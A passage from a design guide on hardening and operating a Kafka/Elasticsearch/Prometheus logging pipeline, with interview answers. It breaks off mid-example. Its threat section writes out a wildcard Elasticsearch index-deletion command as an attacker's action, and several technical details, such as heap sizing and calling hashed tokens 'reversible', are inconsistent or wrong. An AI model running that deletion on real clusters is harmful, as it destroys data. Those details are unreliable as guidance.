**Kafka — ISR (In-Sync Replicas) shrinkage:**

Under high load, replica brokers may fall behind the leader. When a replica is more than `replica.lag.time.max.ms` (default 30s) behind the leader, it is removed from the ISR. If all replicas except the leader fall out of the ISR, `acks=all` writes still succeed (because the ISR is now just the leader) — BUT durability is compromised. If the leader then crashes, data is lost because no follower has the recent data.

Monitor: `kafka.server:type=ReplicaManager,name=UnderReplicatedPartitions` should be 0. Alert if > 0.

**Elasticsearch — GC pressure → circuit breakers:**

Elasticsearch runs on JVM. Under heavy indexing or query load, GC pauses can cause request latency spikes. Elasticsearch has circuit breakers that refuse requests when JVM heap is too full:
- **Field data circuit breaker:** Prevents field data cache from exceeding 60% of heap. Triggers on large aggregations.
- **Request circuit breaker:** Limits memory per request to prevent OOM.
- **Bulk queue circuit breaker:** Rejects bulk indexing when the queue is full.

When circuit breakers trip: `429 Too Many Requests` from Elasticsearch. Logstash/Fluent Bit receive 429, back off (exponential backoff), buffer events. If the backpressure lasts too long, buffers fill, events are dropped.

**Prometheus — WAL replay on restart:**

When Prometheus restarts (after crash, OOM, or deployment), it must replay the Write-Ahead Log to reconstruct the in-memory head block. With a large WAL (many active series, long scrape intervals), WAL replay can take **15–60 minutes**. During this time, Prometheus is not scraping, not evaluating alerts, and not serving queries. All alert evaluation stops.

Fix: Reduce WAL truncation interval (`--storage.tsdb.min-block-duration`). Use persistent volumes with high IOPS (NVMe) to speed up WAL replay. Consider running two Prometheus instances (active/standby) with the same scrape configuration.

### 10.2 Failures Under Attack

**Kafka topic deletion by compromised admin:**
A compromised Kafka admin account can delete the `logs.production` topic, destroying all unprocessed log events. Retention of already-replicated events on S3 cold storage is unaffected, but the last N seconds of events (in Kafka but not yet consumed by the S3 consumer) are permanently lost.

Mitigation: Enable Kafka `delete.topic.enable=false` for production topics. Topic deletion requires a separate change control process (Terraform apply, reviewed and approved).

**Elasticsearch index deletion:**
A compromised Elasticsearch admin account can `DELETE /logs-production-*` (wildcard), deleting all log indices. This destroys the search index but not the cold storage (S3). Recovery requires re-ingesting from cold storage — feasible but takes hours/days.

Mitigation: Elasticsearch destructive actions require `"action.destructive_requires_name": true` (disables wildcard deletes). Separate admin credentials for destructive operations. Automated snapshots to S3 Object Lock (write-once).

### 10.3 Common Misconfigurations

| Misconfiguration | Impact | Detection |
|-----------------|--------|-----------|
| `acks=1` on Kafka producer | Log data loss on broker failure | Kafka config audit |
| Prometheus `--query.timeout` not set | PromQL DoS possible | Config review |
| Elasticsearch `dynamic: true` (default) | Mapping explosion → OOM | Index template audit |
| No log rotation on host | Disk fills → application hangs | Node disk alert |
| Grafana default credentials (admin/admin) | Full dashboard/datasource compromise | First-run check |
| Fluent Bit reading `/` (root) | All files on host accessible | DaemonSet YAML audit |
| Alertmanager API accessible without auth | Anyone can create silences | Network policy audit |
| Elasticsearch open to internet | Full log corpus exposed | Security scanner, Shodan |
| No Prometheus persistent volume | All metrics lost on pod restart | K8s spec review |
| S3 cold storage bucket public | Year+ of logs publicly accessible | AWS Config rule |
| Logstash running as root | Container escape = node root | Pod security policy |
| JWT signing key in ConfigMap | Key exposed to all namespace pods | Secret audit |

---

## 11. Mitigations

### 11.1 Defense-in-Depth for the Logging Pipeline

```
Layer 1: Network isolation
──────────────────────────
• Dedicated "logging" namespace with strict NetworkPolicies
• Only approved namespaces can reach log ingestion endpoints
• Kafka brokers accessible only from logging namespace + producers
• Elasticsearch accessible only from logging namespace + Grafana/Kibana
• Alertmanager API accessible only from Prometheus + approved admin IPs
• Block all egress from logging namespace to internet (Grafana → alert APIs only via proxy)

Layer 2: Authentication
──────────────────────────
• mTLS for all machine-to-machine communication in the pipeline
• Certificates issued by dedicated Monitoring Infra CA (separate from app certs)
• Cert rotation: 30 days, automated via Cert-Manager + Vault
• Human access: SSO + MFA, no direct credential login
• Service accounts: separate per component, least-privilege

Layer 3: Authorization
──────────────────────────
• Kafka: per-topic ACLs (producers can only write their topic; consumers can only read)
• Elasticsearch: X-Pack DLS + FLS; teams see only their service's logs; no cross-team
• Grafana: SSO group-to-role mapping; Explore access only for specific roles
• Alertmanager: admin API restricted to SRE team IP ranges + require re-auth for silences
• S3: bucket policies + Object Lock; no public access; lifecycle requires MFA delete

Layer 4: Data integrity
──────────────────────────
• Kafka topic immutability (delete.topic.enable=false on production topics)
• Elasticsearch: destructive_requires_name=true + snapshot to S3 Object Lock
• S3 cold storage: Object Lock COMPLIANCE mode (7-year retention)
• Log event fingerprinting (SHA-256) for tamper detection
• Separate, independent audit log for security events (write-only, no delete)

Layer 5: Input validation
──────────────────────────
• Kafka producer max.request.size = 1MB (no log bombs)
• Logstash: truncate message field at 10,000 characters
• Elasticsearch: strict mapping (dynamic: strict) — reject unknown fields
• Fluent Bit: max_line_size = 32KB for log line reading

Layer 6: Monitoring the monitoring system
──────────────────────────────────────────
• External watchdog: separate SaaS (Datadog/New Relic) monitors Prometheus uptime
• Dead man's switch: Prometheus sends a constant "alive" alert; if it stops firing,
  Alertmanager routes the ABSENCE of this alert to PagerDuty
• Silence audit: daily report of active Alertmanager silences → security team
• Out-of-band alert channel: critical alerts via SMS (independent of Alertmanager)
```

### 11.2 Kafka Reliability Configuration

```yaml
# Broker configuration (server.properties)
default.replication.factor=3
min.insync.replicas=2              # min ISR before rejecting writes (with acks=all)
log.retention.hours=168            # 7 days
log.retention.bytes=-1             # No size limit (use time only)
delete.topic.enable=false          # Prevent accidental topic deletion
auto.create.topics.enable=false    # Topics must be created explicitly
unclean.leader.election.enable=false  # Never elect out-of-sync replica as leader
                                       # (prefer downtime over data loss)

# Topic-specific (for audit/security logs)
retention.ms=-1                    # Infinite retention (never delete)
cleanup.policy=delete              # (compact would deduplicate; we want all events)
min.insync.replicas=3              # All 3 replicas must be in sync (strongest durability)
```

### 11.3 The Dead Man's Switch

This is the most important reliability pattern for alerting systems. It addresses the failure where the monitoring system itself stops working and nobody notices.

```yaml
# In Prometheus alerts configuration:
- alert: AlwaysFiring
  expr: vector(1)  # Always true
  labels:
    severity: deadmansswitch
  annotations:
    summary: "Prometheus is alive and sending alerts"

# In Alertmanager routing:
- match:
    alertname: AlwaysFiring
  receiver: 'deadmansswitch'
  repeat_interval: 1m   # Send every minute

# Receiver: external endpoint that expects to hear from us every minute
receivers:
  - name: 'deadmansswitch'
    webhook_configs:
      - url: 'https://deadmanssnitch.com/check-in/abc123'
```

**How it works:** Prometheus sends an alert every minute. Alertmanager forwards it to Dead Man's Snitch (or PagerDuty's Dead Man's Switch feature). If Dead Man's Snitch doesn't hear from us within 2 minutes, it pages on-call. This catches: Prometheus crash, Alertmanager crash, network partition between them, silence suppression of all alerts.

---

## 12. Observability (Observing the Observer)

This section covers how to monitor the monitoring system itself. This is a recursive but critical problem.

### 12.1 Logs of the Logging System

Fluent Bit's own logs:
```json
{"timestamp":"2024-01-15T14:32:01Z","level":"warn","service":"fluent-bit",
 "event":"output_retry","plugin":"kafka","retry_count":3,"error":"connection refused",
 "pending_events":4521}

{"timestamp":"2024-01-15T14:32:10Z","level":"error","service":"fluent-bit",
 "event":"chunk_dropped","bytes":204800,"reason":"retry_limit_exceeded"}
```

The second event means 200KB of log data was permanently lost. This should trigger an immediate alert.

**Critical events to log (and alert on):**

| Component | Event | Severity |
|-----------|-------|---------|
| Fluent Bit | `chunk_dropped` | Critical — data loss |
| Fluent Bit | `output_retry > 5` | Warning — pipeline degraded |
| Kafka | `UnderReplicatedPartitions > 0` | Warning — durability at risk |
| Kafka | `OfflinePartitionsCount > 0` | Critical — data unavailable |
| Elasticsearch | `circuit_breaker_tripped` | Warning — capacity issue |
| Elasticsearch | `jvm.gc.major_collection_duration > 5s` | Warning — performance |
| Elasticsearch | `index_latency_ms > 1000` | Warning — indexing lag |
| Logstash | `events_out / events_in < 0.99` | Warning — events being dropped |
| Prometheus | `up == 0` for any target | Warning — scrape failure |
| Prometheus | `prometheus_tsdb_wal_corruption_count > 0` | Critical — data corruption |
| Alertmanager | `alertmanager_silences total > 5` | Warning — unusual silence count |

### 12.2 Metrics for the Pipeline

**Fluent Bit metrics (Prometheus format via `/api/v1/metrics/prometheus`):**
```
fluentbit_input_records_total{name="kubernetes-logs"} 19283741
fluentbit_input_bytes_total{name="kubernetes-logs"} 4328193829
fluentbit_output_retries_total{name="kafka-out"} 23
fluentbit_output_errors_total{name="kafka-out"} 2
fluentbit_output_dropped_records_total{name="kafka-out"} 0  ← should always be 0
```

**Kafka metrics (via JMX exporter):**
```
kafka_server_brokertopicmetrics_messagesin_total{topic="logs.production"} 9283741
kafka_server_brokertopicmetrics_bytesin_total{topic="logs.production"} 38291837492
kafka_consumer_group_lag{consumergroup="elasticsearch-consumer",topic="logs.production"} 1203
kafka_server_replicamanager_underreplicatedpartitions 0  ← alert if > 0
kafka_controller_kafkacontroller_activecontrollercount 1  ← should be exactly 1
```

**Elasticsearch metrics (via Elasticsearch exporter):**
```
elasticsearch_cluster_health_status{cluster="logging"} 1  # 0=red, 1=yellow, 2=green
elasticsearch_indices_indexing_index_total{index="logs-production-*"} 19283741
elasticsearch_indices_indexing_index_time_seconds_total 38291.3
elasticsearch_jvm_gc_collection_seconds_sum{gc="old"} 12.3  ← alert if rising fast
elasticsearch_filesystem_data_available_bytes 423819273819  ← alert if < 20% free
```

**End-to-end pipeline latency metric (most important):**
```
# Custom metric: time from event creation (@timestamp) to Elasticsearch indexing
# Computed by comparing @timestamp in indexed documents to current time

pipeline_log_delivery_latency_seconds{quantile="0.5"} 1.2
pipeline_log_delivery_latency_seconds{quantile="0.99"} 8.3
pipeline_log_delivery_latency_seconds{quantile="1.0"} 45.2  ← outliers from retries
```

### 12.3 Distributed Traces for the Pipeline

OpenTelemetry can instrument the logging pipeline itself:

```
Trace: log_event_lifecycle (trace_id: 4bf92f...)

├─ Span: fluent-bit.read_from_file (0.5ms)
│    tags: file=/var/log/containers/order-service..., bytes=1243
│
├─ Span: fluent-bit.parse_json (0.1ms)
│
├─ Span: fluent-bit.enrich_kubernetes_metadata (0.3ms)
│    tags: pod=order-service-7d8f9b, namespace=production
│
├─ Span: fluent-bit.output_kafka (2.1ms)
│    tags: topic=logs.production, partition=17, offset=9283741
│
├─ Span: logstash.consume_kafka (1.3ms)  [+50ms Kafka wait]
│    tags: consumer_group=logstash-main
│
├─ Span: logstash.filter_pipeline (1.8ms)
│    tags: filters_applied=5, geoip_hit=false
│
└─ Span: logstash.bulk_index_elasticsearch (8.3ms)
     tags: index=logs-production-2024.01.15, docs=500, bytes=204800
```

### 12.4 Alerting Rules for the Pipeline

**Should alert (page):**
```yaml
- alert: LogPipelineDataLoss
  expr: increase(fluentbit_output_dropped_records_total[5m]) > 0
  severity: critical
  # Any dropped records = data loss = page immediately

- alert: KafkaConsumerLagCritical
  expr: kafka_consumer_group_lag{topic="logs.production"} > 100000
  for: 5m
  severity: critical
  # 100k events behind = 100k events not yet indexed = alert blackout

- alert: ElasticsearchClusterRed
  expr: elasticsearch_cluster_health_status{cluster="logging"} == 0
  severity: critical
  # Red = some data unavailable = partial log loss

- alert: PrometheusTargetDown
  expr: up == 0
  for: 5m
  severity: warning
  # Target not scraped for 5m = metrics data gap

- alert: AlertmanagerUnexpectedSilence
  expr: alertmanager_silences > 3  # More than 3 silences at once is unusual
  severity: warning
```

**Should NOT alert:**
- Occasional Fluent Bit retry (transient network hiccup — alert only on sustained)
- Single Kafka consumer lag spike during deployment (consumer restart)
- Individual Elasticsearch slow query (normal; alert on p99, not individual)
- Prometheus WAL replay duration on normal restart (expected)
- Minor Alertmanager grouping delay (30s group_wait is intentional)

---

## 13. Scaling Considerations

### 13.1 Kafka Scaling

**Throughput scaling:**
Kafka throughput is proportional to the number of partitions. More partitions = more parallelism for both producers and consumers.

```
Current: 64 partitions, 10 consumers = 6.4 partitions/consumer
Need 2× throughput: Add 64 partitions = 128 total, add 10 consumers = 6.4 partitions/consumer (same ratio)

CAUTION: You can ADD partitions to a topic, but you CANNOT reduce them.
When you add partitions, existing messages stay in old partitions.
New messages are distributed across ALL partitions (including new ones).
Consumer rebalance required: all consumers in the group temporarily pause.
```

**Retention vs. storage:**
```
Daily log volume: 5TB
Retention: 7 days
Total storage needed: 35TB (uncompressed)
With LZ4 compression (3× ratio): 11.7TB
With 3× replication: 35TB total disk across all brokers
Per broker (3 brokers): 11.7TB
```

**Key sizing factors:**
- Kafka performance is I/O bound — use local NVMe SSDs (not network-attached storage)
- Kafka's sequential I/O pattern is extremely SSD-friendly
- Memory: Kafka uses OS page cache for serving reads — give it 64GB+ RAM to cache hot data
- CPU is rarely the bottleneck for Kafka brokers (unless TLS is enabled without hardware acceleration)

### 13.2 Elasticsearch Scaling

**Node roles and tier architecture:**

```
Hot tier (NVMe SSDs, 48 CPU cores, 256GB RAM per node):
  - Indices from last 7 days
  - High indexing rate, high query rate
  - Node count: scale to maintain <70% CPU, <60% JVM heap
  
Warm tier (SATA SSDs, 16 CPU cores, 128GB RAM per node):
  - Indices from 7-90 days (ILM moves them here automatically)
  - No indexing, moderate query rate
  - Node count: scale to maintain query latency < 1s

Cold tier (HDDs, 8 CPU cores, 64GB RAM per node):
  - Indices from 90-365 days
  - No indexing, low query rate (occasional investigation)
  - Replicas disabled (1 copy only, backfill from S3 if lost)

Frozen tier (S3 + small compute):
  - Indices > 1 year
  - Data on S3, pulled on demand
  - Very slow queries (minutes) acceptable
```

**JVM heap sizing:** 
- Never exceed 30GB JVM heap. Above 30GB, JVM switches from compressed OOPs to full 64-bit pointers, increasing memory usage by ~30% and slowing GC significantly.
- Rule of thumb: 50% of RAM for JVM heap, 50% for OS page cache (Lucene uses page cache directly for index reads).
- 128GB RAM server: 31GB JVM heap + 97GB OS page cache (Lucene benefits enormously).

### 13.3 Prometheus Scaling: Federation and Thanos

**The Prometheus scaling problem:**
A single Prometheus instance can handle ~1 million active time series. A large organization has 10,000 services × 100 metrics × 10 label combinations = 10 million series. One Prometheus can't handle this.

**Solution 1: Federation**
```
Top-level Prometheus (queries aggregates)
  ├── Prometheus for team-A (scrapes team-A services)
  ├── Prometheus for team-B (scrapes team-B services)
  └── Prometheus for infrastructure (scrapes nodes, k8s)
  
Top-level scrapes /federate endpoint from each team Prometheus:
  GET /federate?match[]=job:http_requests_total:rate5m
  (only pre-aggregated recording rules are federated, not raw series)
```

**Solution 2: Thanos (recommended for production)**
```
Each Prometheus has a Thanos Sidecar:
  - Uploads completed TSDB blocks to S3 every 2 hours
  - Exposes StoreAPI for the Thanos Querier to query current data

Thanos Store Gateway:
  - Reads historical blocks from S3
  - Exposes StoreAPI

Thanos Querier:
  - Receives PromQL queries
  - Routes to appropriate Prometheus sidecars (for recent data)
  - Routes to Store Gateway (for historical data)
  - Deduplicates results (if multiple Prometheus instances scrape the same target)
  - Returns merged result

This gives you:
  - Unlimited query range (years of data on S3)
  - High availability (multiple Prometheus instances)
  - Global view (query across all teams/regions)
  - No single Prometheus bottleneck
```

### 13.4 Horizontal vs Vertical Scaling Decision Matrix

| Component | Horizontal | Vertical | Bottleneck | Notes |
|-----------|-----------|---------|-----------|-------|
| Fluent Bit | Yes (DaemonSet, auto-scales with nodes) | N/A | I/O | One per node by design |
| Logstash | Yes (add workers) | Helpful (more pipeline workers) | CPU (parsing) | Stateless, easy to scale |
| Kafka | Yes (add brokers + partitions) | Helpful (more disk) | I/O | Partition rebalance needed |
| Elasticsearch | Yes (add nodes to tier) | Helpful (<30GB heap) | I/O + Memory | Hot shard balancing |
| Prometheus | Limited (see Thanos) | Yes (RAM for series) | RAM (series cardinality) | Thanos for horizontal |
| Alertmanager | Yes (HA cluster) | Minimal | CPU (never the bottleneck) | Use gossip protocol for HA |
| Grafana | Yes (stateless, add replicas) | Minimal | CPU (rendering) | Stateless, trivial scaling |

### 13.5 Consistency Tradeoffs

**Log delivery: At-least-once vs exactly-once**

Kafka with idempotent producer + transactional consumer provides exactly-once semantics. But Elasticsearch indexing with the same event ID (`_id = SHA-256(event)`) also achieves idempotency: indexing the same event twice produces one document (because the ID is the same, the second write is an upsert that sets the same values).

So the practical guarantee is: **exactly-once in Elasticsearch** (via content-addressed ID), **at-least-once in the pipeline** (events may be processed multiple times on failure/retry, but duplicates are deduplicated at storage).

**Metrics: Eventually consistent across shards**

When Grafana queries Prometheus through Thanos and Prometheus is scraping 5,000 targets at 15-second intervals, at any given moment some targets were scraped 14 seconds ago and some were scraped 1 second ago. Queries are inherently "eventually consistent" — the data is stale by up to `scrape_interval + network_latency`. For operational monitoring, this is acceptable. For billing or compliance metrics requiring exact accuracy, use a different system.

---

## 14. Interview Questions

### Q1: A service's logs suddenly disappear from Kibana. Walk through every place the failure could be occurring and how you would diagnose each one.

**Answer:**

Systematically, from producer to consumer:

**Step 1: Is the service still running and logging?**
```bash
kubectl logs order-service-7d8f9b-xk2p4 --tail=10
```
If this returns recent logs: the service is logging to stdout. If empty or stale: the service itself has stopped or is no longer logging (application bug, or the log statement's log level was changed above the current level threshold).

**Step 2: Is Fluent Bit on that node healthy?**
```bash
kubectl get pods -n logging -l app=fluent-bit --field-selector spec.nodeName=ip-10-0-1-45.ec2.internal
kubectl logs fluent-bit-abc12 -n logging --tail=50
```
Look for: `output_error`, `chunk_dropped`, connection refused to Kafka. Check Fluent Bit metrics: `fluentbit_output_dropped_records_total`. Also check if inotify watches are exhausted: `sysctl fs.inotify.max_user_watches` vs `cat /proc/sys/fs/inotify/max_user_watches`.

**Step 3: Is Kafka receiving events for this service?**
```bash
kcat -b kafka.kafka.svc.cluster.local:9093 -C -t logs.production \
  -o -100 -e | jq 'select(.service=="order-service")'
```
Check if recent events for this service appear in Kafka. If not: the problem is between the service and Kafka (Fluent Bit failure, network policy block, mTLS cert expired).

**Step 4: Is the Kafka consumer (Logstash/consumer) processing events?**
```bash
kafka-consumer-groups.sh --bootstrap-server kafka:9093 \
  --describe --group logstash-elasticsearch-consumer
```
Check for consumer lag > 0. If large lag: Logstash is behind. If no lag: Logstash is keeping up but might be failing to write to Elasticsearch.

Check Logstash logs for errors writing to Elasticsearch (authentication failure, mapping conflict, circuit breaker).

**Step 5: Is Elasticsearch accepting writes for this index?**
```bash
curl https://elasticsearch:9200/logs-production-2024.01.15/_stats/indexing | jq '.indices."logs-production-2024.01.15".total.indexing'
```
Check `index_total` — is it increasing? Check `index_failed` — are writes failing? Check shard allocation: `curl https://elasticsearch:9200/_cluster/health?pretty` — is the cluster green?

**Step 6: Is the Kibana query correct?**
Verify the time range in Kibana (obvious but commonly missed). Verify the index pattern matches `logs-production-2024.01.15`. Verify the user has access to this index (DLS might be hiding documents).

**Timing answer:**
- Steps 1-2: 2 minutes (kubectl commands)
- Step 3: 5 minutes (kafka consumer)
- Steps 4-6: 5 minutes each
- Total: ~20 minutes to isolate the failure point

---

### Q2: How would you design the alerting system so that a compromised attacker who has Alertmanager admin access cannot prevent the security team from being notified?

**Answer:**

This requires an out-of-band notification path that does not pass through Alertmanager:

**Design:**

```
Critical Security Alerts
        │
        ├── Path A (through Alertmanager → normal routing)
        │     [attacker can suppress this path]
        │
        └── Path B (direct from Prometheus → PagerDuty API, bypassing Alertmanager)
              [attacker cannot suppress this without also compromising Prometheus]
              
Additional: External watchdog monitors Alertmanager
        │
        └── Checks every 60s: "are there any active critical alerts that have NO
              corresponding Alertmanager firing alert?"
              If yes: direct page (bypassing Alertmanager)
```

**Concrete implementation:**

1. **Separate alerting for security events:** Security-specific alerts (unauthorized access, mass data export, suspicious API patterns) route directly to PagerDuty via a Prometheus recording rule + separate notification script, not through Alertmanager. The script runs as a CronJob and calls the PagerDuty API directly.

2. **Dead Man's Switch (as described in Section 11):** Prometheus sends a constant heartbeat. If Alertmanager stops forwarding it (due to misconfiguration, attack, or crash), the external watchdog pages.

3. **Silence audit out-of-band:** A separate CronJob queries Alertmanager's `/api/v2/silences` API every 5 minutes and sends a report to a dedicated email + Slack channel that is NOT managed by Alertmanager. Any silence lasting > 1 hour for severity=critical triggers an immediate out-of-band page.

4. **Alertmanager HA with quorum for silence creation:** In Alertmanager HA mode (3 instances with gossip protocol), require 2-of-3 approval for silence creation affecting critical alerts. This requires a custom wrapper around the API, but prevents a single compromised admin from creating silences alone.

5. **Separate notification for Alertmanager config changes:** Any change to `alertmanager.yml` (a ConfigMap update) triggers a Kubernetes admission webhook that sends a notification to the security team. This uses a different notification path (Kubernetes events → EventRouter → separate Slack webhook).

**What if:** "What if the attacker also compromises Prometheus?" Then Path B also fails. The answer is defense-in-depth: an external, independent SaaS monitoring tool (Datadog, New Relic, Pingdom) that monitors your key endpoints from outside. This tool has no dependency on your internal Prometheus/Alertmanager and cannot be silenced by an attacker who only has access to internal systems.

---

### Q3: Explain the Kafka consumer lag problem in detail. What does "lag" mean, what causes it, and what are the consequences for a logging pipeline?

**Answer:**

**What lag means:**

Each Kafka partition is an ordered log. The producer writes to the end (latest offset). The consumer reads from its current position (committed offset). Lag = (latest offset) - (committed offset). Lag represents "how many events has this consumer not yet processed."

```
Partition 3 of logs.production:
  Offsets: [0, 1, 2, ..., 9283741, 9283742, 9283743]
           [already consumed ] [lag=2, not yet consumed]
                              ↑
                   Consumer committed offset: 9283741
                   Latest offset: 9283743
                   Lag: 2
```

In a logging pipeline, lag of 2 is fine. Lag of 1,000,000 means the consumer is 1 million events behind — those events are stored in Kafka but not yet indexed in Elasticsearch. Real-time log visibility is delayed by however long it takes to process 1 million events.

**Causes of lag growth:**

1. **Consumer is slow:** Logstash's Elasticsearch bulk write takes 500ms per batch instead of 50ms. The consumer processes 100 events/second; Kafka receives 1,000 events/second. Net lag growth: 900 events/second. After 1 hour: 3.24 million events of lag.

2. **Consumer is down:** Logstash pod crashed. No consumer is running. Kafka receives events at full production rate. Lag grows at 100% of production rate. After 1 hour: entire hour of log data is unindexed.

3. **Elasticsearch is slow:** Elasticsearch circuit breaker is tripping (JVM heap pressure). Bulk writes are being rejected (429). Logstash retries with exponential backoff. Retry time = idle time for the consumer. Lag grows.

4. **Kafka partition imbalance:** All 64 partitions are assigned to 8 consumers (8 partitions each). But one partition has 10× more traffic than others (all logs from one busy service go to the same partition, because the producer is partitioning by `service` field). That consumer is overloaded; others are idle. Lag accumulates on the hot partition.

**Consequences for the logging pipeline:**

- **Alert blackout:** If the alert evaluation consumer (which reads from Kafka and evaluates alert rules) has lag, alerts fire late. A production outage that starts at T=0 might not page until T+30 minutes if the consumer is 30 minutes behind.
- **Stale log searches:** Engineers investigating an incident search Kibana for logs from T=0 to T+5m. But Elasticsearch doesn't have those logs yet (they're in Kafka but not indexed). The investigation uses stale data.
- **Data loss risk:** Kafka has a retention policy (7 days). If lag exceeds 7 days' worth of events, the consumer's committed offset is now before Kafka's earliest available offset. The consumer cannot catch up — those events are deleted from Kafka before being consumed. This is the worst-case failure: permanent data loss.

**Monitoring and response:**
- Alert on lag > 10,000 (warning) and > 100,000 (critical)
- Scale up Logstash consumer instances (add pods)
- Increase Elasticsearch indexing capacity (add hot nodes)
- Check for Elasticsearch circuit breaker trips
- If lag is due to partition imbalance: repartition or change partitioning key

---

### Q4: How does Prometheus handle a target that goes down? What happens to the metrics, the alert, and the data in the TSDB?

**Answer:**

**The target goes down at T=0:**

1. **T=0 to T+15s (next scrape):** Prometheus doesn't know yet. The target was last successfully scraped at T-15s. Prometheus is computing rates from old data. The old data shows normal operations.

2. **T+15s (next scheduled scrape):** Prometheus connects to `http://order-service:8080/metrics`. Connection refused or timeout. Prometheus records this as a failed scrape. The `up` metric for this target is set to `0`:
   ```
   up{job="order-service", instance="10.0.1.45:8080"} 0
   ```
   The previous scraped metrics still exist in the TSDB with their last recorded values — but no new samples arrive. The series are still there; just no new data points.

3. **T+15s to T+5m (alert `for` duration):** The rule `up == 0` is true. Alert enters `PENDING` state. Each 15-second evaluation confirms the alert is still true.

4. **T+5m:** Alert transitions from `PENDING` to `FIRING`. Prometheus sends the alert to Alertmanager. On-call is paged.

5. **What happens to the TSDB:** Prometheus keeps the series (with their last values) in memory for the `--storage.tsdb.retention.time` period (default 15 days). No new samples are written for the downed target. For rate calculations: `rate(http_requests_total[5m])` on data from a downed target returns values based on the last 5 minutes of available data, then 0 (no samples in window). PromQL's `rate()` function handles this correctly — it returns nothing (rather than 0) when there are no samples in the window, allowing you to distinguish "no data" from "zero requests."

6. **When the target comes back up:** Counters may reset (service restarted). `rate()` in Prometheus detects counter resets by checking if the current value is less than the previous value. If so, it assumes a reset happened and adjusts the rate calculation: `rate = (current_value + (previous_value_before_reset - 0)) / time_window`. This handles service restarts gracefully.

7. **Staleness markers:** Prometheus (since version 2.x) uses staleness markers — special "stale" samples written when a target's scrape fails. These propagate through PromQL, ensuring that functions like `avg_over_time()` don't incorrectly average in the last known value for a long time after the target fails.

**What if:** "What if Prometheus itself goes down during the outage?" The target outage goes undetected until Prometheus restarts and catches up. During the downtime, Alertmanager also doesn't receive the `AlwaysFiring` heartbeat → the Dead Man's Switch pages on-call immediately. This is the value of the Dead Man's Switch.

---

### Q5: Explain exactly how Elasticsearch's inverted index works and why it makes log search fast. What are the operational tradeoffs?

**Answer:**

**How a relational database would search logs:**
```sql
SELECT * FROM logs WHERE message LIKE '%payment failed%'
```
This performs a full table scan — read every row, check if `message` contains the string. O(N) where N is the total number of rows. For 1 billion logs: slow.

**How Elasticsearch's inverted index works:**

When a document is indexed, Elasticsearch's analyzer tokenizes the text field:
```
"Payment processing failed for order ord-8823"
→ tokens: ["payment", "processing", "failed", "order", "ord", "8823"]
```

The inverted index maps each token to the list of documents containing it:
```
"payment"    → [doc_1, doc_5, doc_892, doc_4401, ...]
"failed"     → [doc_1, doc_3, doc_892, doc_1023, ...]
"processing" → [doc_1, doc_892, ...]
```

Query: `match: { message: "payment failed" }`
→ Tokenize query: ["payment", "failed"]
→ Look up "payment" → posting list [doc_1, doc_5, doc_892, doc_4401, ...]
→ Look up "failed" → posting list [doc_1, doc_3, doc_892, doc_1023, ...]
→ Intersect both lists (documents matching BOTH terms) → [doc_1, doc_892, ...]

The intersection of sorted posting lists is O(n) where n is the posting list size, not the total document count. For a rare term like "ord-8823", the posting list might have just 1 entry — the lookup is essentially O(1).

**The operational tradeoffs:**

**Tradeoff 1: Index write amplification**
Writing 1 document to Elasticsearch touches 100+ internal data structures (posting lists for each token of each text field, BKD trees for numeric fields, doc values for aggregatable fields). A 1KB log event might require 50KB of write activity. This is why Elasticsearch is write-intensive and requires NVMe SSDs.

**Tradeoff 2: Field data and keyword fields**
Using `text` fields for aggregations (e.g., `agg by service`) requires loading field data into JVM heap. This can exhaust heap memory on high-cardinality fields. `keyword` fields use doc values (disk-based, columnar format) for aggregations — much more memory-efficient.

**Tradeoff 3: Merge storm**
Elasticsearch writes data in segments (immutable, sorted files). Too many small segments slow search (must scan each). Background merges combine segments. A merge storm (many concurrent merges) saturates disk I/O, starving indexing. Result: sudden, severe indexing slowdown. Mitigation: tune `index.merge.scheduler.max_thread_count`.

**Tradeoff 4: Shard sizing**
Each shard is an independent Lucene index. Queries fan out to all shards and merge results. Too many small shards = too much merge overhead on queries. Too few large shards = can't parallelize queries. Rule of thumb: 10–50GB per shard, max 200 shards per node. For a 7-day index at 1TB/day with 7 days = 7TB → 7TB / 30GB per shard ≈ 234 shards. Too many → increase shard size to 50GB → 140 shards. Better.

---

### Q6: How do you handle log data that contains PII under GDPR's right to erasure ("right to be forgotten"), given that logs are append-only?

**Answer:**

GDPR Article 17 requires that a data subject can request erasure of their personal data. Logs are (by design) append-only and immutable. This creates a fundamental conflict.

**Option 1: Tokenization (recommended)**

Before logs enter the pipeline, replace PII with deterministic, reversible tokens:
- `user_id: "usr-4491"` stays as-is (opaque identifier, not directly PII if not linked to a name)
- `email: "alice@example.com"` → `email_token: "tok_sha256(alice@example.com + daily_salt)"`
- `ip_address: "104.21.0.1"` → `ip_token: "tok_sha256(104.21.0.1 + daily_salt)"`

The daily salt is rotated and stored in Vault. For GDPR erasure:
- Delete the salt from Vault → all tokens computed with that salt become permanently unresolvable → the PII is cryptographically erased without touching any log records.
- This is called "crypto-shredding" — destroying the key = destroying the data.

**Option 2: Pseudonymization with deletion table**

Store a mapping: `{ token: sha256(user_id + secret), real_value: user_id }` in a separate, deletable store. For GDPR erasure: delete the row from the mapping table → the token in logs is now unmappable. Logs remain intact; the PII is de-identified.

**Option 3: Selective log expiration**

For each user, track all log index/document IDs that contain their data. On erasure request, update those documents to remove PII fields (Elasticsearch supports partial document updates). This is operationally complex (tracking which logs contain which user data) and expensive (many document updates).

**Option 4: Data minimization (prevent the problem)**

The best solution: don't log PII in the first place. Log user_id (opaque identifier) but not email, name, or phone. Log request_id but not request body (which might contain PII). Conduct a log audit to identify all fields that could be PII and replace or remove them in the application layer.

**What If:** "What if the erasure request covers data that's already in cold storage (S3 Parquet files)?" S3 Object Lock prevents modification. The answer here is crypto-shredding: if the salt used to tokenize that data is deleted, the tokens in the Parquet files become meaningless. The files remain (for technical/audit purposes) but the PII is non-recoverable.

**Engineering tradeoff:** Tokenization adds 5–10ms latency per event (hash computation). For a pipeline processing 100,000 events/second, this is 5–10 CPU cores dedicated to hashing. Acceptable for compliance.

---

### Q7: What is Prometheus's "staleness" mechanism and why does it matter for alerting accuracy?

**Answer:**

**The problem without staleness:** Prometheus scrapes `http_requests_total` every 15 seconds. If a target goes down, the last sample remains in the TSDB. A PromQL query `http_requests_total offset 1m` (value 1 minute ago) would return the pre-failure value, even though the service is down. The `rate()` function, applied over a window after the failure, would see the last good value at T=-15s and no value at T=0 — it would extrapolate a non-zero rate, hiding the failure.

**The staleness mechanism:**

When a scrape fails (or a target is removed from the configuration), Prometheus writes a special "staleness marker" (NaN with a specific bit pattern) to the TSDB for all series from that target. This marker tells PromQL: "this series ended here."

```
Time:    T-60s    T-45s    T-30s    T-15s    T      T+15s
